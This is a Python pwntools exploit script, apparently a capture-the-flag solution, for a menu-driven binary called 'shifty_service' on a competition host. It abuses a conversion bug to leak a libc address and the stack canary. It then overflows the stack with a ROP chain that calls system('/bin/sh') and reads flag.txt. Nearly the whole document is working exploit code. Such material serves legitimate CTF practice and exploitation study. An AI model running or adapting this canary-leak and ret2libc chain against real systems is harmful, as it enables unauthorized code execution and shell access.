from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./shifty_service"
elf = ELF(vuln_path)
libc = elf.libc


def pwn(io):

    def ddebug(b=""):
        if not f_gdb: return
        gdb.attach(io, gdbscript=b)
        pause()

    def add(idx, data):
        io.sendlineafter("> ", "1")
        io.sendlineafter("> ", str(idx))
        io.sendafter("> ", data)

    def convert(f, to, from_enc, to_enc):
        io.sendlineafter("> ", "3")
        io.sendlineafter("> ", str(f))
        io.sendlineafter("> ", str(to))
        io.sendlineafter("> ", from_enc)
        io.sendlineafter("> ", to_enc)

    def show(idx):
        io.sendlineafter("> ", "2")
        io.sendlineafter("> ", str(idx))

    import subprocess
    import chardet

    add(0, "a" * 0x100)

    convert(3, 0, "ISO-8859-1", "ISO-8859-1")
    # convert(-1, 0, "ISO-8859-1", "ISO-8859-1")

    # add(0, "a" * 9 * 8)
    # show(0)
    # io.recvuntil("a" * 9 * 8)
    # stack = u64(io.recv(6).ljust(8, b"\x00")) # + 0x3a0
    # log.success("ret :-----> " + hex(stack))

    # leak libc
    add(0, "a" * 8 * 12)
    show(0)
    io.recvuntil("a" * 8 * 12)
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    libc.address = leak - 0x2a1ca
    log.success("libc.address :-----> " + hex(libc.address))

    # leak canary
    add(0, "a" * 0xf1)
    show(0)
    io.recvuntil("a" * 0xf1)
    canary = u64(io.recv(7).rjust(8, b"\x00"))
    log.success("canary: -----> " + hex(canary))

    # rop
    system_addr = libc.symbols.get("system")
    binsh_addr = next(libc.search("/bin/sh"))
    pop_rdi = next(libc.search(asm("pop rdi; ret")))
    ret = next(libc.search(asm("ret")))
    environ = libc.symbols["__environ"]

    payload = b"b" * 0x50
    payload += p64(canary) + p64(0)
    payload += p64(0x0401016)
    payload += p64(pop_rdi) + p64(binsh_addr)
    payload += p64(system_addr)
    add(0, payload)
    convert(0, 3, "ISO-8859-1", "ISO-8859-1")
    # ddebug("b *0x04012A3 \n b *0x40165D\n b *0x004015C1\n b *0x401707\n continue")
    show(0)

    io.sendlineafter("> ", "4")
    io.sendline(b"cat flag.txt")
    data = io.recv(100, timeout=1)
    if b"{" in data:
        log.success(data)
        sleep(9999)

    io.interactive()


def getio():
    io = process([vuln_path]) if not f_remote else remote("chal1.fwectf.com", 8002)
    return io


for i in range(0x30):
    io = None
    try:
        io = getio()
        pwn(io)
    except Exception as e:
        pass
    finally:
        if io:
            io.close()
